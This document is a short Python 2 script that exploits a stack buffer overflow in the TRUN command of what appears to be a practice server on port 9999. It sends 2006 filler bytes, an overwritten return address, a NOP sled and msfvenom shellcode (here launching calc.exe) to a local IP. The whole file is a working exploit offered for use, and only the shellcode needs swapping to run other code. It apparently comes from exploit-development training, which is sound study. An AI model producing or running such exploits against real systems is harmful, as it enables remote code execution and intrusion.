#!/usr/bin/python
import socket
server = '192.168.1.59'
sport = 9999

#shellcode msfvenom -p windows/exec -b '\x00\x0A\x04\x38' -f python --var-name buf CMD=calc.exe EXITFUNC=thread
prefix = 'A' * 2006
eip = '\xaf\x11\x50\x62'
nopsled = '\x90' * 16

buf =  ""
buf += "\xd9\xe5\xd9\x74\x24\xf4\xbb\xbd\x73\xa8\xbb\x5a\x29"
buf += "\xc9\xb1\x31\x83\xea\xfc\x31\x5a\x14\x03\x5a\xa9\x91"
buf += "\x5d\x47\x39\xd7\x9e\xb8\xb9\xb8\x17\x5d\x88\xf8\x4c"
buf += "\x15\xba\xc8\x07\x7b\x36\xa2\x4a\x68\xcd\xc6\x42\x9f"
buf += "\x66\x6c\xb5\xae\x77\xdd\x85\xb1\xfb\x1c\xda\x11\xc2"
buf += "\xee\x2f\x53\x03\x12\xdd\x01\xdc\x58\x70\xb6\x69\x14"
buf += "\x49\x3d\x21\xb8\xc9\xa2\xf1\xbb\xf8\x74\x8a\xe5\xda"
buf += "\x77\x5f\x9e\x52\x60\xbc\x9b\x2d\x1b\x76\x57\xac\xcd"
buf += "\x47\x98\x03\x30\x68\x6b\x5d\x74\x4e\x94\x28\x8c\xad"
buf += "\x29\x2b\x4b\xcc\xf5\xbe\x48\x76\x7d\x18\xb5\x87\x52"
buf += "\xff\x3e\x8b\x1f\x8b\x19\x8f\x9e\x58\x12\xab\x2b\x5f"
buf += "\xf5\x3a\x6f\x44\xd1\x67\x2b\xe5\x40\xcd\x9a\x1a\x92"
buf += "\xae\x43\xbf\xd8\x42\x97\xb2\x82\x08\x66\x40\xb9\x7e"
buf += "\x68\x5a\xc2\x2e\x01\x6b\x49\xa1\x56\x74\x98\x86\xb9"
buf += "\x96\x09\xf2\x51\x0f\xd8\xbf\x3f\xb0\x36\x83\x39\x33"
buf += "\xb3\x7b\xbe\x2b\xb6\x7e\xfa\xeb\x2a\xf2\x93\x99\x4c"
buf += "\xa1\x94\x8b\x2e\x24\x07\x57\x9f\xc3\xaf\xf2\xdf"


padding = 'F' * (3000 - 2006 - 4 - 16 - len(buf))
attack = prefix + eip + nopsled + buf + padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)
print "Sending attack to TRUN . with length ", len(attack)
s.send(('TRUN .' + attack + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()